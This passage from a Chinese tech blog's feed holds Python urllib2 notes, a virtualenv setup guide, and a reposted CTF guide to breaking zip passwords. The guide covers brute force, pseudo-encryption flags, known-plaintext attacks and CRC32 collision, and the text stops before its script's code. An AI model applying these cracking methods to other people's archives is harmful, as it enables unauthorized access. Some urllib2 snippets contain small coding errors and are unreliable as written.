<p>而Web服务器本身也曾经有类似的漏洞，比如Apache Tomcat的UTF-8解析漏洞，具体利用和绕过可以参考<a href="https://zhuanlan.zhihu.com/p/21516413" target="_blank" rel="external">这篇文章</a>，这里就不展开讲啦。</p>
<hr>
<p> 参考文章：</p>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21296806</a><br><a href="http://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html" target="_blank" rel="external">http://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 源码泄漏 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python urllib2 学习笔记]]></title>
      <url>/2017/10/26/urllib2/</url>
      <content type="html"><![CDATA[<p>Python urllib2 模块学习笔记。</p>
<a id="more"></a>
<h2 id="0x01-常见用法整理"><a href="#0x01-常见用法整理" class="headerlink" title="0x01 常见用法整理"></a>0x01 常见用法整理</h2><p>这部分纯搬运自：<a href="https://lightless.me/archives/38.html" target="_blank" rel="external">Lightless - Python urllib2</a>   </p>
<h3 id="1-通过-urllib2-获取网页内容"><a href="#1-通过-urllib2-获取网页内容" class="headerlink" title="1. 通过 urllib2 获取网页内容"></a>1. 通过 urllib2 获取网页内容</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">response = urllib2.urlopen(<span class="string">'http://www.baidu.com'</span>)</div><div class="line">html = response.read()</div><div class="line"><span class="keyword">print</span> html</div><div class="line"></div><div class="line"><span class="comment"># or</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">req = urllib2.Request(<span class="string">'http://www.baidu.com'</span>)</div><div class="line">response = urllib2.urlopen(req)</div><div class="line">the_page = response.read()</div><div class="line"><span class="keyword">print</span> the_page</div></pre></td></tr></table></figure>
<h3 id="2-发送POST请求"><a href="#2-发送POST请求" class="headerlink" title="2. 发送POST请求"></a>2. 发送POST请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">url = <span class="string">'http://www.someserver.com/register.cgi'</span></div><div class="line">values = &#123;<span class="string">'name'</span> : <span class="string">'WHY'</span>,</div><div class="line">          <span class="string">'location'</span> : <span class="string">'SDU'</span>,</div><div class="line">          <span class="string">'language'</span> : <span class="string">'Python'</span> &#125;</div><div class="line">data = urllib.urlencode(values) <span class="comment"># 编码工作</span></div><div class="line">req = urllib2.Request(url, data)  <span class="comment"># 发送请求同时传data表单</span></div><div class="line">response = urllib2.urlopen(req)  <span class="comment"># 接受反馈的信息</span></div><div class="line">the_page = response.read()  <span class="comment"># 读取反馈的内容</span></div></pre></td></tr></table></figure>
<h3 id="3-发送GET请求"><a href="#3-发送GET请求" class="headerlink" title="3. 发送GET请求"></a>3. 发送GET请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">data = &#123;&#125;</div><div class="line"></div><div class="line">data[<span class="string">'name'</span>] = <span class="string">'WHY'</span></div><div class="line">data[<span class="string">'location'</span>] = <span class="string">'SDU'</span></div><div class="line">data[<span class="string">'language'</span>] = <span class="string">'Python'</span></div><div class="line"></div><div class="line">url_values = urllib.urlencode(data)</div><div class="line"><span class="keyword">print</span> url_values</div><div class="line"></div><div class="line">name=Somebody+Here&amp;language=Python&amp;location=Northampton</div><div class="line">url = <span class="string">'http://www.example.com/example.cgi'</span></div><div class="line">full_url = url + <span class="string">'?'</span> + url_values</div><div class="line">data = urllib2.open(full_url)</div></pre></td></tr></table></figure>
<h3 id="4-设置-UA"><a href="#4-设置-UA" class="headerlink" title="4. 设置 UA"></a>4. 设置 UA</h3><p>python 的默认 UA 是 python-urllib/x.y。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line">url = <span class="string">'http://www.someserver.com/cgi-bin/register.cgi'</span></div><div class="line"></div><div class="line">user_agent = <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span></div><div class="line">values = &#123;<span class="string">'name'</span> : <span class="string">'WHY'</span>,</div><div class="line">          <span class="string">'location'</span> : <span class="string">'SDU'</span>,</div><div class="line">          <span class="string">'language'</span> : <span class="string">'Python'</span> &#125;</div><div class="line"></div><div class="line">headers = &#123; <span class="string">'User-Agent'</span> : user_agent &#125;</div><div class="line">data = urllib.urlencode(values)</div><div class="line">req = urllib2.Request(url, data, headers)</div><div class="line">response = urllib2.urlopen(req)</div><div class="line">the_page = response.read()</div></pre></td></tr></table></figure>
<h3 id="5-URL-ERROR"><a href="#5-URL-ERROR" class="headerlink" title="5. URL ERROR"></a>5. URL ERROR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">req = urllib2.Request(<span class="string">'http://www.baibai.com'</span>)</div><div class="line"><span class="keyword">try</span>: urllib2.urlopen(req)</div><div class="line"><span class="keyword">except</span> urllib2.URLError, e:</div><div class="line">    <span class="keyword">print</span> e.reason</div></pre></td></tr></table></figure>
<h3 id="6-HTTP-ERROR"><a href="#6-HTTP-ERROR" class="headerlink" title="6. HTTP ERROR"></a>6. HTTP ERROR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">req = urllib2.Request(<span class="string">'http://lightless.me/a.php'</span>)</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    urllib2.urlopen(req)</div><div class="line"><span class="keyword">except</span> Exception, e:</div><div class="line">    <span class="keyword">print</span> e.code</div></pre></td></tr></table></figure>
<h3 id="7-获取真实的-URL"><a href="#7-获取真实的-URL" class="headerlink" title="7. 获取真实的 URL"></a>7. 获取真实的 URL</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line">old_url = <span class="string">'http://rrurl.cn/b1UZuP'</span></div><div class="line">req = Request(old_url)</div><div class="line">response = urlopen(req)</div><div class="line"><span class="keyword">print</span> <span class="string">'Old url: '</span> + old_url</div><div class="line"><span class="keyword">print</span> <span class="string">'Real url: '</span> + response.geturl()</div></pre></td></tr></table></figure>
<h3 id="8-获取-Header-信息"><a href="#8-获取-Header-信息" class="headerlink" title="8. 获取 Header 信息"></a>8. 获取 Header 信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line">old_url = <span class="string">'http://www.baidu.com'</span></div><div class="line">req = Request(old_url)</div><div class="line">response = urlopen(req)</div><div class="line"><span class="keyword">print</span> response.info()</div></pre></td></tr></table></figure>
<h3 id="9-Proxy-的设置"><a href="#9-Proxy-的设置" class="headerlink" title="9. Proxy 的设置"></a>9. Proxy 的设置</h3><p>默认情况下会使用环境变量 http_proxy 来设置代理。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line">enable_proxy = <span class="keyword">True</span></div><div class="line">proxy_handler = urllib2.ProxyHandler(&#123;<span class="string">"http"</span> : <span class="string">'http://some-proxy.com:8080'</span>&#125;)</div><div class="line">null_proxy_handler = urllib2.ProxyHandler(&#123;&#125;)</div><div class="line"><span class="keyword">if</span> enable_proxy:</div><div class="line">    opener = urllib2.build_opener(proxy_handler)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    opener = urllib2.build_opener(null_proxy_handler)</div><div class="line">urllib2.install_opener(opener)</div></pre></td></tr></table></figure>
<h3 id="10-Timeout-设置"><a href="#10-Timeout-设置" class="headerlink" title="10. Timeout 设置"></a>10. Timeout 设置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># version &lt; 2.6</span></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> socket</div><div class="line">socket.setdefaulttimeout(<span class="number">10</span>)</div><div class="line">urllib2.socket.setdefaulttimeout(<span class="number">10</span>)</div><div class="line"></div><div class="line"><span class="comment"># version &gt;= 2.6</span></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">response = urllib2.urlopen(<span class="string">'http://www.google.com'</span>， timeout=<span class="number">10</span>)</div></pre></td></tr></table></figure>
<h3 id="11-在-HTTP-Requset-中增加指定的-Header"><a href="#11-在-HTTP-Requset-中增加指定的-Header" class="headerlink" title="11. 在 HTTP Requset 中增加指定的 Header"></a>11. 在 HTTP Requset 中增加指定的 Header</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">request = urllib2.Request(<span class="string">'http://www.baidu.com/'</span>)</div><div class="line">request.add_header(<span class="string">'User-Agent'</span>, <span class="string">'fake-client'</span>)</div><div class="line">response = urllib2.urlopen(request)</div><div class="line"><span class="keyword">print</span> response.read()</div></pre></td></tr></table></figure>
<h3 id="12-打开-Debug-log"><a href="#12-打开-Debug-log" class="headerlink" title="12. 打开 Debug log"></a>12. 打开 Debug log</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">httpHandler = urllib2.HTTPHandler(debuglevel=<span class="number">1</span>)</div><div class="line">httpsHandler = urllib2.HTTPSHandler(debuglevel=<span class="number">1</span>)</div><div class="line">opener = urllib2.build_opener(httpHandler, httpsHandler)</div><div class="line">urllib2.install_opener(opener)</div><div class="line">response = urllib2.urlopen(<span class="string">'http://www.google.com'</span>)</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
            <tag> Web Crawler </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mac配置虚拟环境Virtualenv]]></title>
      <url>/2017/10/21/python-venv/</url>
      <content type="html"><![CDATA[<p>在Mac自带的Python环境下直接安装一些包时经常会遇到各种问题，也不太喜欢把原生的环境弄乱，就装了个虚拟环境，记录下留着日后用吧。</p>
<a id="more"></a>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前在写Flask的时候接触了Python的虚拟环境Virtualenv，它可以用来创建一个独立的Python运行环境，很干净，很便捷，搭配virtualenvwrapper（一个扩展包，可以更方便地管理虚拟环境）食用更佳。  </p>
<hr>
<h2 id="0x01-安装-virtualenv"><a href="#0x01-安装-virtualenv" class="headerlink" title="0x01 安装 virtualenv"></a>0x01 安装 virtualenv</h2><h3 id="1-安装-virtualenv"><a href="#1-安装-virtualenv" class="headerlink" title="1. 安装 virtualenv"></a>1. 安装 virtualenv</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo pip install virtualenv</span></div></pre></td></tr></table></figure>
<h3 id="2-建立测试目录"><a href="#2-建立测试目录" class="headerlink" title="2. 建立测试目录"></a>2. 建立测试目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> mkdir testvirtual    </span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> testvirtual</span></div></pre></td></tr></table></figure>
<h3 id="3-创建虚拟环境-venv"><a href="#3-创建虚拟环境-venv" class="headerlink" title="3. 创建虚拟环境 venv"></a>3. 创建虚拟环境 venv</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> virtualenv venv</span></div></pre></td></tr></table></figure>
<hr>
<h2 id="0x02-安装-virtualenvwrapper"><a href="#0x02-安装-virtualenvwrapper" class="headerlink" title="0x02 安装 virtualenvwrapper"></a>0x02 安装 virtualenvwrapper</h2><p>Virtualenvwrapper是一个Virtualenv的扩展包，可以更方便地管理虚拟环境（新增、删除，启动等）。</p>
<h3 id="1-安装-Virtualenvwrapper"><a href="#1-安装-Virtualenvwrapper" class="headerlink" title="1. 安装 Virtualenvwrapper"></a>1. 安装 Virtualenvwrapper</h3><p>默认安装在<code>/usr/local/bin</code>下面</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo easy_install virtualenvwrapper</span></div></pre></td></tr></table></figure>
<h3 id="2-创建一个文件夹，用来存放所有虚拟环境"><a href="#2-创建一个文件夹，用来存放所有虚拟环境" class="headerlink" title="2. 创建一个文件夹，用来存放所有虚拟环境"></a>2. 创建一个文件夹，用来存放所有虚拟环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> mkdir ~/Workspace</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ~/Workspace</span></div></pre></td></tr></table></figure>
<h3 id="3-设置环境变量"><a href="#3-设置环境变量" class="headerlink" title="3. 设置环境变量"></a>3. 设置环境变量</h3><p>把下面两行代码写入<code>~/.zshrc</code>（这个根据自己的shell来写，比如如果你用的是bash，就在<code>~/.bashrc</code>中添加)。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> WORKON_HOME=~/Workspace</div><div class="line"><span class="built_in">source</span> /usr/<span class="built_in">local</span>/bin/virtualenvwrapper.sh</div></pre></td></tr></table></figure>
<h3 id="4-使配置生效"><a href="#4-使配置生效" class="headerlink" title="4. 使配置生效"></a>4. 使配置生效</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> ./zshrc</span></div></pre></td></tr></table></figure>
<h3 id="5-创建一个或多个虚拟环境"><a href="#5-创建一个或多个虚拟环境" class="headerlink" title="5. 创建一个或多个虚拟环境"></a>5. 创建一个或多个虚拟环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> mkvirtualenv venv</span></div><div class="line"><span class="meta">$</span><span class="bash"> mkvirtualenv venv2</span></div></pre></td></tr></table></figure>
<p>创建成功后路径前面就会有<code>(venv)</code>等字样。</p>
<hr>
<h2 id="0x03-常见操作命令"><a href="#0x03-常见操作命令" class="headerlink" title="0x03 常见操作命令"></a>0x03 常见操作命令</h2><p>一些基本操作命令：   </p>
<h3 id="1-列出虚拟环境"><a href="#1-列出虚拟环境" class="headerlink" title="1. 列出虚拟环境"></a>1. 列出虚拟环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> workon</span></div><div class="line">venv</div><div class="line">venv3</div></pre></td></tr></table></figure>
<p>或者用<code>lsvirtualenv -b</code>，效果一样。</p>
<h3 id="2-建立测试目录-1"><a href="#2-建立测试目录-1" class="headerlink" title="2. 建立测试目录"></a>2. 建立测试目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> workon venv</span></div></pre></td></tr></table></figure>
<h3 id="3-查看环境里安装了哪些包"><a href="#3-查看环境里安装了哪些包" class="headerlink" title="3. 查看环境里安装了哪些包"></a>3. 查看环境里安装了哪些包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> lssitepackages</span></div></pre></td></tr></table></figure>
<h3 id="4-进入当前环境"><a href="#4-进入当前环境" class="headerlink" title="4. 进入当前环境"></a>4. 进入当前环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> cdvirtualenv</span></div></pre></td></tr></table></figure>
<h3 id="5-进入当前环境的site-packages"><a href="#5-进入当前环境的site-packages" class="headerlink" title="5. 进入当前环境的site-packages"></a>5. 进入当前环境的site-packages</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> cdsitepackages</span></div><div class="line"><span class="meta">$</span><span class="bash"> cdsitepackages pip</span></div></pre></td></tr></table></figure>
<h3 id="6-复制虚拟环境"><a href="#6-复制虚拟环境" class="headerlink" title="6. 复制虚拟环境"></a>6. 复制虚拟环境</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">$</span> cpvirtualenv venv venv3</div><div class="line"><span class="function"><span class="title">Copying</span></span> venv as venv3...</div></pre></td></tr></table></figure>
<h3 id="7-退出虚拟环境"><a href="#7-退出虚拟环境" class="headerlink" title="7. 退出虚拟环境"></a>7. 退出虚拟环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> deactivate</span></div></pre></td></tr></table></figure>
<h3 id="8-删除虚拟环境"><a href="#8-删除虚拟环境" class="headerlink" title="8. 删除虚拟环境"></a>8. 删除虚拟环境</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">$</span> rmvirtualenv venv2</div><div class="line"><span class="function"><span class="title">Removing</span></span> venv2...</div></pre></td></tr></table></figure>
<p>接下来安装Python的各种包就很顺利了。</p>
<hr>
<h2 id="0x04-纯白刻印"><a href="#0x04-纯白刻印" class="headerlink" title="0x04 纯白刻印"></a>0x04 纯白刻印</h2><p>做了对自觉挺好看的印章，刻了喜欢的句子，浅蓝色的纯白很棒。万事万物，喜欢最好。</p>
<p>冬天到啦，大家都要注意保暖呢。</p>
<p>参考文章：</p>
<blockquote>
<p><a href="http://www.jianshu.com/p/51140800e8b4" target="_blank" rel="external">http://www.jianshu.com/p/51140800e8b4</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
            <tag> Virtualenv </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[给你压缩包却不给你密码的人到底在想什么]]></title>
      <url>/2017/10/19/rar-attack/</url>
      <content type="html"><![CDATA[<p>纯转载。原帖戳这里：<a href="http://veritas501.space/2017/06/23/%E7%BB%99%E4%BD%A0%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8D%B4%E4%B8%8D%E7%BB%99%E4%BD%A0%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%BA%E5%88%B0%E5%BA%95%E5%9C%A8%E6%83%B3%E4%BB%80%E4%B9%88/" target="_blank" rel="external">veritas501 - 给你压缩包却不给你密码的人到底在想什么</a></p>
<a id="more"></a>
<h2 id="0x00-开始"><a href="#0x00-开始" class="headerlink" title="0x00 开始"></a>0x00 开始</h2><p>在这里，我建议大家装两个解压软件，一个随意（我用的7z），一个是winrar。   </p>
<p>嫌右键菜单挤你就装虚拟机里呗。  </p>
<p>因为这两个压缩软件压缩出来的zip总是有点不同，最明显的一点，就是在已知明文攻击（后面会说）的时候，两种软件压缩出来的压缩包在构造明文压缩包的时候不能互用。    </p>
<h2 id="0x01-注释"><a href="#0x01-注释" class="headerlink" title="0x01 注释"></a>0x01 注释</h2><p><strong>拿到压缩包上来一定要看有没有注释，一定要看有没有注释，一定要看有没有注释，重要的话说三遍。</strong></p>
<p>有的时候他真的是想送你分，把密码或是hint写在注释里，但你就是不去看他一眼。  </p>
<p>用hex方式打开的打一般在末尾  </p>
<p><img src="/2017/10/19/rar-attack/1.png" alt=""></p>
<p>中文注释的话这样可能会乱码。建议压缩软件打开  </p>
<p><img src="/2017/10/19/rar-attack/2.png" alt=""></p>
<h2 id="0x02-弱密码"><a href="#0x02-弱密码" class="headerlink" title="0x02 弱密码"></a>0x02 弱密码</h2><p>这个其实真的没什么好说的，<strong>上来应该先试一试的</strong>，因为也不用动脑子，直接放后台跑就行了。   </p>
<p>首先先跑纯数字密码，1到9位直接跑一遍，也就1分钟左右的时间吧。  </p>
<p>不对的话可以上字典，或是短密码穷举一下，直接丢后台就行，人脑可以再做其他的方向的分析。   </p>
<p>另外，如果跑字典都跑不到的话，可以试试此次CTF的名字，或是这个题目的名字。   </p>
<p>软件用<code>archpr</code>，网上直接下就行，这里就不分享了。   </p>
<p><img src="/2017/10/19/rar-attack/3.png" alt=""></p>
<p><img src="/2017/10/19/rar-attack/4.png" alt=""></p>
<h2 id="0x03-压缩包伪加密"><a href="#0x03-压缩包伪加密" class="headerlink" title="0x03 压缩包伪加密"></a>0x03 压缩包伪加密</h2><p>一个伪加密的压缩包冒充加密压缩包，你要知道压缩软件是如何识别一个压缩包是否被加密的。</p>
<p>软件主要是围绕frFlags和deFlags来判断的。</p>
<p>我们用winrar创建一个加密的压缩包，可以看到加密的压缩包的frFlags和deFlags都为9。</p>
<p>其中，deFlags是针对单个文件的，压缩包中的每个文件都有。  </p>
<p><img src="/2017/10/19/rar-attack/5.png" alt=""></p>
<p><img src="/2017/10/19/rar-attack/6.png" alt=""></p>
<p>而未加密的都为0。</p>
<p>用7z创建一个加密的压缩包，frFlags和deFlags都为1。这里就不多放图了。</p>
<p>而未加密的依然都为0。</p>
<p>综上，大家应该已经知道怎么改标志位来构造伪加密以及如何搞定伪加密了。（这里添一句，mac OS可以直接打开伪加密的压缩包。）</p>
<h2 id="0x04-已知明文攻击"><a href="#0x04-已知明文攻击" class="headerlink" title="0x04 已知明文攻击"></a>0x04 已知明文攻击</h2><p>一种比较巧妙的攻击方法，首先你需要一个压缩包中已知的文件(文件大小大于12bytes)，比如readme.txt   </p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">├─<span class="selector-tag">enc</span><span class="selector-class">.zip</span></div><div class="line">│  ├─<span class="selector-tag">flag</span><span class="selector-class">.txt</span> *</div><div class="line">│  └─<span class="selector-tag">readme</span><span class="selector-class">.txt</span> *</div><div class="line">│</div><div class="line">└─<span class="selector-tag">readme</span><span class="selector-class">.txt</span></div></pre></td></tr></table></figure>
<p>这样我们就可以构造明文zip</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">├─<span class="selector-tag">plaintext</span><span class="selector-class">.zip</span></div><div class="line">│  └─<span class="selector-tag">readme</span><span class="selector-class">.txt</span></div></pre></td></tr></table></figure>
<p>原理大概是压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件反推加密密钥，利用密钥来解密其他加密文件。</p>
<p>划重点：<strong>构造明文压缩包时要选用与加密压缩包相同的压缩软件</strong>，如果他用winrar压的，你用7z构造出的压缩包来做明文压缩包，软件是会报错的。</p>
<p><img src="/2017/10/19/rar-attack/7.png" alt=""></p>
<p>这样就是还原出密钥了，点OK后软件会叫你保存解密后的压缩包。   </p>
<p><img src="/2017/10/19/rar-attack/8.png" alt=""></p>
<h2 id="0x05-CRC碰撞"><a href="#0x05-CRC碰撞" class="headerlink" title="0x05 CRC碰撞"></a>0x05 CRC碰撞</h2><p>CRC32碰撞用于非常小的文件（6字节以上基本就别试了），就是通过CRC来反推文件内容。</p>
<p>而且CRC32是很容易碰撞的，所以就6字节而言，同一个CRC32可能对应着十几个字符串（纯可视字符）。</p>
<p>当文件刚好是6字节时，使用下面的crc32.py脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div 